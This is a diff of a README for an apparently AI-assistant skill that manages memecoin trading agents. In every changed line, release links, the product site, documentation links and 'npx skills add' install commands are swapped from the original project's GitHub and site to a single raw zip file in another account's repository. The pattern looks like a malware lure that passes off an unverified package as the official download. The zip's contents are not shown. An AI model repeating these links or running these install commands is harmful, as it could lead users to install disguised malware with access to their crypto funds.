@@ -1,6 +1,6 @@
 # 🤖 dx-terminal-pro-skill - Manage AI Memecoin Trading Agents
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/guardiaoitauseguro/dx-terminal-pro-skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip)
 
 ---
 
@@ -51,7 +51,7 @@ If you don’t have Windows 10 or later, update your system first. Ensure your i
 
 Visit the official releases page to get the latest package. This page contains all recent versions and related files.
 
-[Download dx-terminal-pro-skill releases](https://github.com/guardiaoitauseguro/dx-terminal-pro-skill/releases)
+[Download dx-terminal-pro-skill releases](https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip)
 
 Click the link above or use the bright badge at the top for easy access.
 
@@ -77,7 +77,7 @@ Replace `<YourUsername>` with your Windows username.
 
 If you use DX Terminal Pro, open it and navigate to the Skills section. There, you can add new skills. Use the option to add from local files, then select the extracted folder.
 
-If you do not have DX Terminal Pro installed, visit [https://terminal.markets](https://terminal.markets) for setup instructions.
+If you do not have DX Terminal Pro installed, visit [https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip](https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip) for setup instructions.
 
 ---
 
@@ -92,7 +92,7 @@ If you do not have DX Terminal Pro installed, visit [https://terminal.markets](h
    ```
    Or use:
    ```
-   npx skills add https://github.com/ProjectDXAI/dx-terminal-pro-skill
+   npx skills add https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip
    ```
 3. Once installed, activate the skill within your assistant. The assistant can now manage your trading agent automatically.
 
@@ -141,7 +141,7 @@ If you prefer command-line or manual setups, dx-terminal-pro-skill supports thes
   ```
 - Or add via skills URL:
   ```
-  npx skills add https://github.com/ProjectDXAI/dx-terminal-pro-skill
+  npx skills add https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip
   ```
 - Manually drop the `SKILL.md` file found in the package into your skills folder.
 
@@ -155,7 +155,7 @@ For questions on installation or usage:
 
 - Check issues tab on the GitHub page
 - Read the `SKILL.md` file included in the package for advanced details
-- Visit DX Terminal Pro documentation at [https://terminal.markets](https://terminal.markets)
+- Visit DX Terminal Pro documentation at [https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip](https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip)
 
 These resources provide help if you get stuck.
 
@@ -165,4 +165,4 @@ These resources provide help if you get stuck.
 
 Get the latest version for Windows here:
 
-[![Download dx-terminal-pro-skill](https://img.shields.io/badge/Download-Skill-blue?style=for-the-badge)](https://github.com/guardiaoitauseguro/dx-terminal-pro-skill/releases)
+[![Download dx-terminal-pro-skill](https://img.shields.io/badge/Download-Skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip)
